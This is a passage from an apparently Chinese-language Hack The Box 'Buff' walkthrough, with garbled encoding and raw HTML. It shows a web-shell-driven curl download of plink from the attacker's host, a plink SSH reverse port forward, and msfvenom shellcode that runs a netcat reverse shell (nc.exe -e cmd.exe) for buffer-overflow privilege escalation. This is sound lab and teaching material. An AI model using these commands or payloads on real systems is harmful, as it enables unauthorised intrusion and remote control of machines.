class="built_in">cd</span>\</span><br></pre></td></tr></table></figure><p><code>æ‰¾åˆ°user.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\shaun\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A22D-49F7</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\shaun\Desktop</span><br><span class="line"></span><br><span class="line">14/07/2020  13:27    &lt;DIR&gt;          .</span><br><span class="line">14/07/2020  13:27    &lt;DIR&gt;          ..</span><br><span class="line">01/09/2020  07:25                34 user.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   8,142,823,424 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\shaun\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">*********************************</span><br></pre></td></tr></table></figure><h2 id="0x07-ææƒ"><a href="#0x07-ææƒ" class="headerlink" title="0x07.ææƒ"></a>0x07.ææƒ</h2><p><code>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶ï¼Œå‘ç°å¥½å¤š&quot;å‰è¾ˆ&quot;ä¸Šä¼ çš„æ–‡ä»¶ğŸ˜‚</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A22D-49F7</span><br><span class="line"></span><br><span class="line"> Directory of C:\xampp\htdocs\gym\upload</span><br><span class="line"></span><br><span class="line">01/09/2020  08:55    &lt;DIR&gt;          .</span><br><span class="line">01/09/2020  08:55    &lt;DIR&gt;          ..</span><br><span class="line">01/09/2020  07:52         7,481,344 chisel.exe</span><br><span class="line">01/09/2020  08:33                53 kamehameha.php</span><br><span class="line">21/08/2017  14:40            59,392 nc.exe</span><br><span class="line">01/09/2020  08:54            59,392 ncat.exe</span><br><span class="line">01/09/2020  08:55           311,296 p1ink.exe</span><br><span class="line">21/08/2017  14:40           311,296 plink.exe</span><br><span class="line">01/09/2020  08:39                47 shell.php</span><br><span class="line">               7 File(s)      8,222,820 bytes</span><br><span class="line">               2 Dir(s)   8,263,647,232 bytes free</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure><p><code>ä¸Šä¼ plink</code></p><blockquote><p>Plinkæ˜¯Windowså‘½ä»¤è¡ŒSSHå®¢æˆ·ç«¯ï¼Œplinkæ˜¯sshåè®®çš„ä¸€ä¸ªå®ç°ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># cp /usr/share/windows-binaries/plink.exe ./htb/buff/</span></span><br><span class="line">root@JIYE:~<span class="comment">#root@JIYE:~/htb/buff# ls</span></span><br><span class="line">flag  gymrce.py  nc.exe  nmap.CVT  plink.exe</span><br><span class="line">root@JIYE:~/htb/buff<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.198 - - [01/Sep/2020 04:35:27] <span class="string">&quot;GET /plink.exe HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjE5ODo4MDgwL3VwbG9hZC9rYW1laGFtZWhhLnBocD90ZWxlcGF0aHk9Y3VybA==">http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovLzEwLjEwLjE3LjIxNi9wbGluay5leGU=">http://10.10.17.216/plink.exe<i class="fa fa-external-link-alt"></i></span> -o plink_f.exe</p></blockquote><img src="/2020/09/01/HTB-buff/image-20200901163645906.png" class><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A22D-49F7</span><br><span class="line"></span><br><span class="line"> Directory of C:\xampp\htdocs\gym\upload</span><br><span class="line"></span><br><span class="line">01/09/2020  09:37    &lt;DIR&gt;          .</span><br><span class="line">01/09/2020  09:37    &lt;DIR&gt;          ..</span><br><span class="line">01/09/2020  07:52         7,481,344 chisel.exe</span><br><span class="line">01/09/2020  09:33                53 kamehameha.php</span><br><span class="line">21/08/2017  14:40            59,392 nc.exe</span><br><span class="line">01/09/2020  08:54            59,392 ncat.exe</span><br><span class="line">01/09/2020  08:55           311,296 p1ink.exe</span><br><span class="line">21/08/2017  14:40           311,296 plink.exe</span><br><span class="line">01/09/2020  09:37           311,296 plink_f.exe</span><br><span class="line">01/09/2020  08:39                47 shell.php</span><br><span class="line">               8 File(s)      8,534,116 bytes</span><br><span class="line">               2 Dir(s)   8,604,606,464 bytes free</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹ç³»ç»Ÿæ¶æ„ï¼Œç»“æœä¸º64ä½</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;systeminfo   </span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 BUFF</span><br><span class="line">OS Name:                   Microsoft Windows 10 Enterprise</span><br><span class="line">OS Version:                10.0.17134 N/A Build 17134</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          shaun</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00329-10280-00000-AA218</span><br><span class="line">Original Install Date:     16/06/2020, 15:05:58</span><br><span class="line">System Boot Time:          01/09/2020, 10:57:29</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19/06/2019</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume2</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-gb;English (United Kingdom)</span><br><span class="line">Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London</span><br><span class="line">Total Physical Memory:     4,095 MB</span><br><span class="line">Available Physical Memory: 2,240 MB</span><br><span class="line">Virtual Memory: Max Size:  4,799 MB</span><br><span class="line">Virtual Memory: Available: 2,325 MB</span><br><span class="line">Virtual Memory: In Use:    2,474 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    WORKGROUP</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.198</span><br><span class="line">                                 [02]: fe80::fc70:a698:752c:f5c3</span><br><span class="line">                                 [03]: dead:beef::9007:7d8e:af8f:9419</span><br><span class="line">                                 [04]: dead:beef::fc70:a698:752c:f5c3</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure><p><code>æœ¬æ¥æƒ³ä¸Šä¼ ä¸ªwinPEASx64.exeæ‰«æå¯ä»¥ç”¨æ¥ææƒçš„ç¨‹åºï¼Œéœ¸ç‰¹ä¸èƒ½æ‰§è¡Œã€‚ã€‚</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line">    Directory: C:\xampp\htdocs\gym\upload</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                               </span><br><span class="line">----                -------------         ------ ----                               </span><br><span class="line">-a----       01/09/2020     14:32             53 kamehameha.php                    </span><br><span class="line">-a----       01/09/2020     11:01          59392 nc.exe                             </span><br><span class="line">-a----       01/09/2020     14:12          38616 nc1.exe                             </span><br><span class="line">-a----       01/09/2020     12:48              0 pe.exe                             </span><br><span class="line">-a----       01/09/2020     11:01         311296 plink.exe                           </span><br><span class="line">-a----       01/09/2020     12:17              5 start</span><br><span class="line">-a----       01/09/2020     12:17              5 status                             </span><br><span class="line">-a----       01/09/2020     14:16            400 winP                               </span><br><span class="line">-a----       01/09/2020     14:19          33057 winP.bat                           </span><br><span class="line">-a----       01/09/2020     14:16            400 winP.exe                           </span><br><span class="line">-a----       01/09/2020     13:16         279987 winPEAS.bat                         </span><br><span class="line">-a----       01/09/2020     13:05          87839 winPEASany.exe                     </span><br><span class="line">-a----       01/09/2020     12:45              0 winPEASexe                         </span><br><span class="line">-a----       01/09/2020     13:10          87839 winPEASx64.exe                     </span><br><span class="line">PS C:\xamp\htdocs\gym\upload&gt; </span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹ç«¯å£æš‚ç”¨æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°8888è¢«ç›‘å¬</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;netstat -nao | findstr <span class="string">&quot;8888&quot;</span></span><br><span class="line">netstat -nao | findstr <span class="string">&quot;8888&quot;</span></span><br><span class="line">  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       5828</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨plinkè¿›è¡Œç«¯å£è½¬å‘ï¼Œéœ¸ç‰¹å¤±è´¥äº†ï¼Œä¸ªäººçŒœæµ‹æ˜¯é˜²ç«å¢™çš„åŸå› ã€‚</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br></pre></td></tr></table></figure><blockquote><p>æŠ¥é”™ä¸ºï¼šæ— æ³•åŒæ„å¯†é’¥äº¤æ¢ç®—æ³•</p><p>Googleä¸€ä¸‹å‘ç°éœ€è¦æ›´æ–°puttyï¼Œä½†æ˜¯æ›´æ–°åè¿˜æ˜¯ä¸å¥½ä½¿ã€‚ã€‚ã€‚èœç‹—ä¸€è„¸èŒ«ç„¶ï¼</p><p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw â€œrootâ€ -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjMTExOyYjMTExOyYjMTE2OyYjeDQwOyYjeDMxOyYjeDMwOyYjNDY7JiN4MzE7JiM0ODsmIzQ2OyYjeDMxOyYjeDM3OyYjeDJlOyYjeDMyOyYjNDk7JiM1NDs=">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x30;&#46;&#x31;&#48;&#46;&#x31;&#x37;&#x2e;&#x32;&#49;&#54;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw â€œrootâ€ -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjeDZmOyYjMTExOyYjMTE2OyYjeDQwOyYjNDk7JiM0ODsmI3gyZTsmIzQ5OyYjNDg7JiM0NjsmI3gzMTsmIzU1OyYjeDJlOyYjeDMyOyYjeDMxOyYjeDM2Ow==">&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#48;&#x2e;&#49;&#48;&#46;&#x31;&#55;&#x2e;&#x32;&#x31;&#x36;<i class="fa fa-external-link-alt"></i></span><br>Looking up host â€œ10.10.17.216â€<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldnâ€™t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiMxMTQ7JiN4NzY7JiMxMDE7JiN4MzI7JiN4MzU7JiN4MzU7JiN4MzE7JiM1NzsmI3gyZDsmI3g3MzsmIzEwNDsmI3g2MTsmI3gzMjsmIzUzOyYjNTQ7JiN4NDA7JiMxMDg7JiMxMDU7JiN4NjI7JiN4NzM7JiN4NzM7JiMxMDQ7JiN4MmU7JiN4NmY7JiN4NzI7JiMxMDM7">&#99;&#x75;&#114;&#x76;&#101;&#x32;&#x35;&#x35;&#x31;&#57;&#x2d;&#x73;&#104;&#x61;&#x32;&#53;&#54;&#x40;&#108;&#105;&#x62;&#x73;&#x73;&#104;&#x2e;&#x6f;&#x72;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldnâ€™t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjeDYzOyYjMTE3OyYjeDcyOyYjMTE4OyYjeDY1OyYjeDMyOyYjNTM7JiM1MzsmIzQ5OyYjeDM5OyYjeDJkOyYjMTE1OyYjeDY4OyYjeDYxOyYjeDMyOyYjNTM7JiM1NDsmIzY0OyYjeDZjOyYjMTA1OyYjeDYyOyYjeDczOyYjMTE1OyYjMTA0OyYjNDY7JiN4NmY7JiMxMTQ7JiN4Njc7">&#x63;&#117;&#x72;&#118;&#x65;&#x32;&#53;&#53;&#49;&#x39;&#x2d;&#115;&#x68;&#x61;&#x32;&#53;&#54;&#64;&#x6c;&#105;&#x62;&#x73;&#115;&#104;&#46;&#x6f;&#114;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p></blockquote><p><code>ç¬¬äºŒå¤©æˆ‘åˆæ¥äº†ï¼Œè¿™å›æˆåŠŸäº†ï¼ï¼Œè¿™å›æ¢æˆäº†powershellã€‚</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; .\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">.\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">Looking up host <span class="string">&quot;10.10.17.216&quot;</span> <span class="keyword">for</span> SSH connection</span><br><span class="line">Connecting to 10.10.17.216 port 22</span><br><span class="line">We claim version: SSH-2.0-PuTTY_Release_0.74</span><br><span class="line">Remote version: SSH-2.0-OpenSSH_8.3p1 Debian-1</span><br><span class="line">Using SSH protocol version 2</span><br><span class="line">Doing ECDH key exchange with curve Curve25519 and <span class="built_in">hash</span> SHA-256 (SHA-NI accelerated)</span><br><span class="line">Server also has ecdsa-sha2-nistp256/ssh-rsa host keys, but we don<span class="string">&#x27;t know any of them</span></span><br><span class="line"><span class="string">Host key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">The server&#x27;</span>s host key is not cached <span class="keyword">in</span> the registry. You</span><br><span class="line">have no guarantee that the server is the computer you</span><br><span class="line">think it is.</span><br><span class="line">The server<span class="string">&#x27;s ssh-ed25519 key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">If you trust this host, enter &quot;y&quot; to add the key to</span></span><br><span class="line"><span class="string">PuTTY&#x27;</span>s cache and carry on connecting.</span><br><span class="line">If you want to carry on connecting just once, without</span><br><span class="line">adding the key to the cache, enter <span class="string">&quot;n&quot;</span>.</span><br><span class="line">If you <span class="keyword">do</span> not trust this host, press Return to abandon the</span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) outbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) outbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) compression after user authentication</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) inbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) inbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) decompression after user authentication</span><br><span class="line">Using username <span class="string">&quot;root&quot;</span>.</span><br><span class="line">Sent password</span><br><span class="line">Initialised delayed zlib (RFC1950) decompression</span><br><span class="line">Initialised delayed zlib (RFC1950) compression</span><br><span class="line">Access granted</span><br><span class="line">Requesting remote port 8888 forward to 127.0.0.1:8888</span><br><span class="line">Opening main session channel</span><br><span class="line">Remote port forwarding from 8888 enabled</span><br><span class="line">Opened main channel</span><br><span class="line">Started a shell/<span class="built_in">command</span></span><br><span class="line">Linux JIYE 5.7.0-kali1-amd64 <span class="comment">#1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">ls</span><br><span class="line">arachni</span><br><span class="line">cacert.der</span><br><span class="line">clash</span><br><span class="line">CS4.0</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">get-pip.py</span><br><span class="line">htb</span><br><span class="line">Lluna.ovpn</span><br><span class="line">Lluna.ovpn.bak</span><br><span class="line">Music</span><br><span class="line">Pictures</span><br><span class="line">Public</span><br><span class="line">python_shell</span><br><span class="line">Templates</span><br><span class="line">Videos</span><br><span class="line">vulnhub</span><br></pre></td></tr></table></figure><p><code>ä¸‹é¢ç”¨Buffer Overflow æ¥ææƒ</code><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDgzODk=">URL<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>ä½¿ç”¨msfvenomç”Ÿæˆshellcodeæ›¿æ¢åŸæ¥çš„</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># msfvenom -p windows/exec CMD=&#x27;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.17.216 7078&#x27; -b &#x27;\x00\x0A\x0D&#x27; -f python -v payload</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 274 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 274</span><br><span class="line">Payload size: 274 bytes</span><br><span class="line">Final size of python file: 1456 bytes</span><br><span class="line">payload =  b<span class="string">&quot;&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xba\xd7\xda\x14\xc1\xdb\xcd\xd9\x74\x24\xf4\x58&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x31\xc9\xb1\x3e\x31\x50\x15\x83\xc0\x04\x03\x50&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x11\xe2\x22\x26\xfc\x43\xcc\xd7\xfd\x23\x45\x32&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xcc\x63\x31\x36\x7f\x54\x32\x1a\x8c\x1f\x16\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x07\x6d\xbe\xa0\xa0\xd8\x98\x8f\x31\x70\xd8\x8e&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xb1\x8b\x0c\x71\x8b\x43\x41\x70\xcc\xbe\xab\x20&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x85\xb5\x19\xd5\xa2\x80\xa1\x5e\xf8\x05\xa1\x83&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x49\x27\x80\x15\xc1\x7e\x02\x97\x06\x0b\x0b\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4b\x36\xc2\x24\xbf\xcc\xd5\xec\xf1\x2d\x79\xd1&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x3d\xdc\x80\x15\xf9\x3f\xf7\x6f\xf9\xc2\x0f\xb4&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x83\x18\x9a\x2f\x23\xea\x3c\x94\xd5\x3f\xda\x5f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xd9\xf4\xa9\x38\xfe\x0b\x7e\x33\xfa\x80\x81\x94&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x8a\xd3\xa5\x30\xd6\x80\xc4\x61\xb2\x67\xf9\x72&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x1d\xd7\x5f\xf8\xb0\x0c\xd2\xa3\xde\xd3\x61\xde&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xad\xd4\x79\xe1\x81\xbc\x48\x6a\x4e\xba\x55\xb9&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x2a\x34\x1c\xe0\x1b\xdd\xf8\x70\x1e\x80\xfb\xae&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x5d\xbd\x7f\x5b\x1e\x3a\x9f\x2e\x1b\x06\x18\xc2&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x51\x17\xcc\xe4\xc6\x18\xc5\xa6\xd2\xba\x9d\x49&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4e\x33\x2d\xd6\xf8\xc7\xa9\x89\x9b\x54\x6d\x31&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x25\xf6\xd1\xc8\xa5\x64\x86\x53\x22\x29\x36\xf7&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x84\xb4\xbe\x92\xf8\x1b\x5b\x7d\x9a\x0e\xc7\x53&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x39\xa9\x62\x8c\xf0\x79\x42\xfd\xc2\x57\xab\xca&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x0c\x9a\xfa\x02\x71\xed\xcc\x5d\x49\x11&quot;</span></span><br><span class="line">root@JIYE:~/htb/buff<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>ç¼–è¾‘payload</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 